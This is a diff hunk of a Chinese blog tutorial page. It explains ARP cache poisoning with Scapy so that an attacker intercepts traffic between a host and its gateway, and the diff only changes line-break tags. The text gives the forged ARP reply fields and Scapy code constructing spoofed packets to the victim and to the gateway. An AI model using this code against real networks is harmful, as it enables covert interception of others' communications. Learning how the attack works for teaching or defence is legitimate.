@@ -204,13 +204,13 @@ sendp() 需要手动填以太网的信息
 <h2 id="5、Scapy实现ARP的毒化攻击"><a href="#5、Scapy实现ARP的毒化攻击" class="headerlink" title="5、Scapy实现ARP的毒化攻击"></a>5、Scapy实现ARP的毒化攻击</h2><p>原理：</p>
 <p><img src="" class="lazyload" data-src="https://i.loli.net/2019/08/30/zKlWci79yTHxwQG.png"  alt="攻击之前.png"></p>
 <p><img src="" class="lazyload" data-src="!%5B%E6%94%BB%E5%87%BB%E4%B9%8B%E5%90%8E.jpg%5D(https://i.loli.net/2019/08/30/rkwa8dRBtmoFWJT.jpg)"  alt="攻击之后"></p>
-<p>所以，只需要修改A中的ARP缓存表，将与B对应的MAC修改。<br />于是，发给A的ARP响应报文格式应为：</p>
+<p>所以，只需要修改A中的ARP缓存表，将与B对应的MAC修改。<br>于是，发给A的ARP响应报文格式应为：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">目的IP：A</span><br><span class="line">目的MAC：A</span><br><span class="line">源IP：B</span><br><span class="line">源MAC：C</span><br></pre></td></tr></table></figure>
 
-<p>就能实现上图功能。<br />紧接着，如果B要发消息给A，那么A中的ARP表可能会调整回正确的，于是可以向B发送ARP报文，格式为：</p>
+<p>就能实现上图功能。<br>紧接着，如果B要发消息给A，那么A中的ARP表可能会调整回正确的，于是可以向B发送ARP报文，格式为：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">目的IP：B</span><br><span class="line">目的MAC：B</span><br><span class="line">源IP：A</span><br><span class="line">源MAC：C</span><br></pre></td></tr></table></figure>
 
-<p>这样，B发往A的数据包也会走向C了，A，B双方的通信都将被C截获。<br />通常，B往往是路由器，所以B的IP地址一般是默认网关。</p>
+<p>这样，B发往A的数据包也会走向C了，A，B双方的通信都将被C截获。<br>通常，B往往是路由器，所以B的IP地址一般是默认网关。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">	源IP为默认网关的IP</span></span><br><span class="line"><span class="string">	源MAC为默认网关的MAC</span></span><br><span class="line"><span class="string">	目的IP为需要毒化主机的IP</span></span><br><span class="line"><span class="string">	目的MAC为需要毒化主机的MAC</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pkgtoHost=Ether(src=localmac,dst=tgmac)/ARP(op=<span class="number">2</span>,hwsrc=localmac,psrc=gatewayip,hwdst=tgmac,pdst=tgip)</span><br><span class="line">gatewayMac=getmacbyip(gatewayip)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">	源IP为被攻击主机的IP</span></span><br><span class="line"><span class="string">	源MAC为本机MAC</span></span><br><span class="line"><span class="string">	目的IP为默认网关的IP</span></span><br><span class="line"><span class="string">	目的MAC为默认网关的MAC</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pkgtoGateway=Ether(src=localmac,dst=gatewayMac)/ARP(hwdst=gatewayMac,pdst=gatewayip,psrc=tgip,hwsrc=localmac,op=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
 
 
